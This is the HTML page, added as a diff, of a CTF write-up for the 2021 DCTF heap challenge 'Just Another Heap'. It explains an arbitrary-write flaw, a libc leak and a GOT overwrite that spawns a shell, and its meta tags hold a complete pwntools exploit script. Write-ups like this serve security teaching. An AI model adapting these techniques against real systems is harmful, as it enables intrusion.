@@ -1,0 +1,839 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.1 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>2021 dctf write-up - Hacky Life &amp; Writeup</title>
+<meta name="description" content="Tasks     Pwn💻            Just Another Heap (500pts)           Just Another Heap (500pts)  I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.       It has 5 user functions(create, relive, forget, change, listing).   create() has a role that makes malloc_frame(0x20) and  malloc_userinput(size). The point is, this prob has a unique fading input with this part.  puts(&quot;How long is your memory&quot;); input_lu(&amp;size);                          // no size check malloc_user = malloc(size);               // size &gt; 0x308 / forget -&gt; unsorted bin puts(&quot;Sometimes our memories fade and we only remember parts of them.&quot;); input_lu(&amp;fade);                          // no filter puts(&quot;Would you like to leave some space at the beginning in case you remember later?&quot;); if ( fade &lt;= size ) {   if ( malloc_user )   {     for ( i = 0; i &lt; fade; ++i )       malloc_user[i] = &#39;_&#39;;   }   malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.  Exploit  First, set chunks that size&gt;0x408 between 2 small chunks to leak libc from main_arena+xx.  And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.  and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.     change() function : overwrite from the beginning or behind fade _ strings   relive() function : print user input with fade _ string   Finally, Use This mentioned skills to do GOT Overwriting.     memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.   input /bin/sh\x00 in malloc_frame[] and program will call strcspn(addr,&#39;\n&#39;). Get The Shell.  Code  Here is the Exploit Code.  from pwn import *  context.log_level=&#39;debug&#39;  def create(idx, name, size, hide, cont, important, recent):   p.recv()   p.sendline(str(1))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(name)   p.recv()   p.sendline(str(size))   p.recv()   p.sendline(str(hide))   p.recv()   p.sendline(cont)   p.recv()   p.sendline(important)   p.recv()   p.sendline(recent)  def relive(idx):   p.recv()   p.sendline(str(2))   p.recv()   p.sendline(str(idx))  def change(idx, cont):   p.recv()   p.sendline(str(4))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(&quot;Y&quot;)   p.recv()   p.send(cont)  def forget(idx):   p.recv()   p.sendline(str(3))   p.recv()   p.sendline(str(idx))  def listing():   p.recv()   p.sendline(str(5))  p=remote(&quot;dctf-chall-just-another-heap.westeurope.azurecontainer.io&quot;, 7481) #p=process(&quot;./just_another_heap&quot;) e=ELF(&quot;./just_another_heap&quot;) l=e.libc  create(0, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(1, &quot;B&quot;*8, 0x410, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(2, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) forget(0) forget(1) #pause() create(3, &quot;B&quot;*8, 0x410, 6, &quot;&quot;, &quot;N&quot;, &quot;N&quot;) #pause() change(3,&quot;A&quot;*8) relive(3)  p.recvuntil(&quot;A&quot;*7+&quot; &quot;) libc_base=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x3ebca0  print hex(libc_base)  create(4, &quot;C&quot;*8, libc_base, e.got[&#39;strcspn&#39;], p64(libc_base+l.sym[&#39;system&#39;]), &quot;N&quot;, &quot;N&quot;) pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(&quot;//bin/sh\x00&quot;) p.interactive()">
+
+
+  <meta name="author" content="st4rlight (Ainsetin)">
+  
+  <meta property="article:author" content="st4rlight (Ainsetin)">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacky Life & Writeup">
+<meta property="og:title" content="2021 dctf write-up">
+<meta property="og:url" content="http://localhost:4000/ctf/dctf_2021_just_another_heap/">
+
+
+  <meta property="og:description" content="Tasks     Pwn💻            Just Another Heap (500pts)           Just Another Heap (500pts)  I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.       It has 5 user functions(create, relive, forget, change, listing).   create() has a role that makes malloc_frame(0x20) and  malloc_userinput(size). The point is, this prob has a unique fading input with this part.  puts(&quot;How long is your memory&quot;); input_lu(&amp;size);                          // no size check malloc_user = malloc(size);               // size &gt; 0x308 / forget -&gt; unsorted bin puts(&quot;Sometimes our memories fade and we only remember parts of them.&quot;); input_lu(&amp;fade);                          // no filter puts(&quot;Would you like to leave some space at the beginning in case you remember later?&quot;); if ( fade &lt;= size ) {   if ( malloc_user )   {     for ( i = 0; i &lt; fade; ++i )       malloc_user[i] = &#39;_&#39;;   }   malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.  Exploit  First, set chunks that size&gt;0x408 between 2 small chunks to leak libc from main_arena+xx.  And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.  and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.     change() function : overwrite from the beginning or behind fade _ strings   relive() function : print user input with fade _ string   Finally, Use This mentioned skills to do GOT Overwriting.     memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.   input /bin/sh\x00 in malloc_frame[] and program will call strcspn(addr,&#39;\n&#39;). Get The Shell.  Code  Here is the Exploit Code.  from pwn import *  context.log_level=&#39;debug&#39;  def create(idx, name, size, hide, cont, important, recent):   p.recv()   p.sendline(str(1))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(name)   p.recv()   p.sendline(str(size))   p.recv()   p.sendline(str(hide))   p.recv()   p.sendline(cont)   p.recv()   p.sendline(important)   p.recv()   p.sendline(recent)  def relive(idx):   p.recv()   p.sendline(str(2))   p.recv()   p.sendline(str(idx))  def change(idx, cont):   p.recv()   p.sendline(str(4))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(&quot;Y&quot;)   p.recv()   p.send(cont)  def forget(idx):   p.recv()   p.sendline(str(3))   p.recv()   p.sendline(str(idx))  def listing():   p.recv()   p.sendline(str(5))  p=remote(&quot;dctf-chall-just-another-heap.westeurope.azurecontainer.io&quot;, 7481) #p=process(&quot;./just_another_heap&quot;) e=ELF(&quot;./just_another_heap&quot;) l=e.libc  create(0, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(1, &quot;B&quot;*8, 0x410, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(2, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) forget(0) forget(1) #pause() create(3, &quot;B&quot;*8, 0x410, 6, &quot;&quot;, &quot;N&quot;, &quot;N&quot;) #pause() change(3,&quot;A&quot;*8) relive(3)  p.recvuntil(&quot;A&quot;*7+&quot; &quot;) libc_base=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x3ebca0  print hex(libc_base)  create(4, &quot;C&quot;*8, libc_base, e.got[&#39;strcspn&#39;], p64(libc_base+l.sym[&#39;system&#39;]), &quot;N&quot;, &quot;N&quot;) pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(&quot;//bin/sh\x00&quot;) p.interactive()">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-05-17T19:18:39+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/ctf/dctf_2021_just_another_heap/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacky Life & Writeup Feed">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script type="text/javascript">
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  window.enable_copy_code_button = true;
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Hacky Life & Writeup
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/ctf/"
+                
+                
+              >Note</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/ctf/"
+                
+                
+              >CTF Write-up</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/life/"
+                
+                
+              >Life</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="https://ainsetin.notion.site/Ainsetin-s-Write-up-c1a0fb95760b41508d54ce94dc3601c5"
+                
+                
+              >Notion</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="https://discord.gg/RpBGcjSWZN"
+                
+                
+              >Discord</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/images/profile.jpg" alt="st4rlight (Ainsetin)" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">st4rlight (Ainsetin)</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>be the special st4rlight in the world</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Seoul, Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+            <li><a href="https://x.com/ainsetin" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">X</span></a></li>
+          
+        
+          
+            <li><a href="https://facebook.com/ainsetin" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i><span class="label">Facebook</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/bww9641" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://instagram.com/st4rlight_bww" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+    
+      
+      
+      
+      
+    
+    
+      <nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      
+      
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="2021 dctf write-up">
+    <meta itemprop="description" content="Tasks  Pwn💻          Just Another Heap (500pts)      Just Another Heap (500pts)I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.  It has 5 user functions(create, relive, forget, change, listing).create() has a role that makes malloc_frame(0x20) and  malloc_userinput(size).The point is, this prob has a unique fading input with this part.puts(&quot;How long is your memory&quot;);input_lu(&amp;size);                          // no size checkmalloc_user = malloc(size);               // size &gt; 0x308 / forget -&gt; unsorted binputs(&quot;Sometimes our memories fade and we only remember parts of them.&quot;);input_lu(&amp;fade);                          // no filterputs(&quot;Would you like to leave some space at the beginning in case you remember later?&quot;);if ( fade &lt;= size ){  if ( malloc_user )  {    for ( i = 0; i &lt; fade; ++i )      malloc_user[i] = &#39;_&#39;;  }  malloc_user += fade;memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0.So, if malloc(size) returns 0, I can overwrite anywhere.ExploitFirst, set chunks that size&gt;0x408 between 2 small chunksto leak libc from main_arena+xx.And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.  change() function : overwrite from the beginning or behind fade _ strings  relive() function : print user input with fade _ stringFinally, Use This mentioned skills to do GOT Overwriting.  memories will be faded fade bytes with _, and user input is behind the _ stringsif malloc_user is NOT 0.So, if malloc(size) returns 0, I can overwrite anywhere.input /bin/sh\x00 in malloc_frame[] and program will call strcspn(addr,&#39;\n&#39;). Get The Shell.CodeHere is the Exploit Code.from pwn import *context.log_level=&#39;debug&#39;def create(idx, name, size, hide, cont, important, recent):  p.recv()  p.sendline(str(1))  p.recv()  p.sendline(str(idx))  p.recv()  p.sendline(name)  p.recv()  p.sendline(str(size))  p.recv()  p.sendline(str(hide))  p.recv()  p.sendline(cont)  p.recv()  p.sendline(important)  p.recv()  p.sendline(recent)def relive(idx):  p.recv()  p.sendline(str(2))  p.recv()  p.sendline(str(idx))def change(idx, cont):  p.recv()  p.sendline(str(4))  p.recv()  p.sendline(str(idx))  p.recv()  p.sendline(&quot;Y&quot;)  p.recv()  p.send(cont)def forget(idx):  p.recv()  p.sendline(str(3))  p.recv()  p.sendline(str(idx))def listing():  p.recv()  p.sendline(str(5))p=remote(&quot;dctf-chall-just-another-heap.westeurope.azurecontainer.io&quot;, 7481)#p=process(&quot;./just_another_heap&quot;)e=ELF(&quot;./just_another_heap&quot;)l=e.libccreate(0, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;)create(1, &quot;B&quot;*8, 0x410, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;)create(2, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;)forget(0)forget(1)#pause()create(3, &quot;B&quot;*8, 0x410, 6, &quot;&quot;, &quot;N&quot;, &quot;N&quot;)#pause()change(3,&quot;A&quot;*8)relive(3)p.recvuntil(&quot;A&quot;*7+&quot; &quot;)libc_base=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x3ebca0print hex(libc_base)create(4, &quot;C&quot;*8, libc_base, e.got[&#39;strcspn&#39;], p64(libc_base+l.sym[&#39;system&#39;]), &quot;N&quot;, &quot;N&quot;)pause()p.recv()p.sendline(str(1))p.recv()p.sendline(&quot;//bin/sh\x00&quot;)p.interactive()">
+    <meta itemprop="datePublished" content="2021-05-17T19:18:39+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">
+            <a href="http://localhost:4000/ctf/dctf_2021_just_another_heap/" itemprop="url">2021 dctf write-up
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#tasks">Tasks</a></li><li><a href="#just-another-heap-500pts">Just Another Heap (500pts)</a><ul><li><a href="#exploit">Exploit</a></li><li><a href="#code">Code</a></li></ul></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="tasks">Tasks</h2>
+
+<ul>
+  <li>Pwn💻
+    <ul>
+      <li>Just Another Heap (500pts)</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="just-another-heap-500pts">Just Another Heap (500pts)</h2>
+
+<p>I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.</p>
+
+<p><img src="/images/2021-dctf/1.png" alt="1.png" /></p>
+
+<ul>
+  <li>It has 5 user functions(create, relive, forget, change, listing).</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">create()</code> has a role that makes malloc_frame(0x20) and  malloc_userinput(size).
+The point is, this prob has a unique fading input with this part.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"How long is your memory"</span><span class="p">);</span>
+<span class="n">input_lu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>                          <span class="c1">// no size check</span>
+<span class="n">malloc_user</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>               <span class="c1">// size &gt; 0x308 / forget -&gt; unsorted bin</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"Sometimes our memories fade and we only remember parts of them."</span><span class="p">);</span>
+<span class="n">input_lu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fade</span><span class="p">);</span>                          <span class="c1">// no filter</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"Would you like to leave some space at the beginning in case you remember later?"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">fade</span> <span class="o">&lt;=</span> <span class="n">size</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">malloc_user</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">fade</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="n">malloc_user</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'_'</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">malloc_user</span> <span class="o">+=</span> <span class="n">fade</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>memories will be faded <code class="language-plaintext highlighter-rouge">fade</code> bytes with <code class="language-plaintext highlighter-rouge">_</code>, and user input is behind the <code class="language-plaintext highlighter-rouge">_</code> strings if malloc_user is NOT 0.
+So, if <code class="language-plaintext highlighter-rouge">malloc(size)</code> returns <code class="language-plaintext highlighter-rouge">0</code>, I can overwrite anywhere.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>First, set chunks that <code class="language-plaintext highlighter-rouge">size&gt;0x408</code> between 2 small chunks
+to leak libc from <code class="language-plaintext highlighter-rouge">main_arena+xx</code>.</p>
+
+<p>And make 1 tcache and <code class="language-plaintext highlighter-rouge">0x410</code> unsorted bin. Now <code class="language-plaintext highlighter-rouge">main_arena+xx</code> has written in unsorted bin.</p>
+
+<p>and if I rewrite and use <code class="language-plaintext highlighter-rouge">change()</code> to fill fade bytes and get libc addr with <code class="language-plaintext highlighter-rouge">relive()</code> function.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">change()</code> function : overwrite from the beginning or behind fade <code class="language-plaintext highlighter-rouge">_</code> strings</li>
+  <li><code class="language-plaintext highlighter-rouge">relive()</code> function : print user input with fade <code class="language-plaintext highlighter-rouge">_</code> string</li>
+</ul>
+
+<p>Finally, Use This mentioned skills to do GOT Overwriting.</p>
+
+<blockquote>
+  <p>memories will be faded <code class="language-plaintext highlighter-rouge">fade</code> bytes with <code class="language-plaintext highlighter-rouge">_</code>, and user input is behind the <code class="language-plaintext highlighter-rouge">_</code> strings
+if malloc_user is NOT 0.
+So, if <code class="language-plaintext highlighter-rouge">malloc(size)</code> returns <code class="language-plaintext highlighter-rouge">0</code>, I can overwrite anywhere.</p>
+</blockquote>
+
+<p>input <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> in malloc_frame[] and program will call <code class="language-plaintext highlighter-rouge">strcspn(addr,'\n')</code>. Get The Shell.</p>
+
+<h3 id="code">Code</h3>
+
+<p>Here is the Exploit Code.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">hide</span><span class="p">,</span> <span class="n">cont</span><span class="p">,</span> <span class="n">important</span><span class="p">,</span> <span class="n">recent</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">hide</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">important</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">recent</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">relive</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">Y</span><span class="sh">"</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">forget</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">listing</span><span class="p">():</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">dctf-chall-just-another-heap.westeurope.azurecontainer.io</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
+<span class="c1">#p=process("./just_another_heap")
+</span><span class="n">e</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./just_another_heap</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">l</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">libc</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">forget</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="nf">forget</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1">#pause()
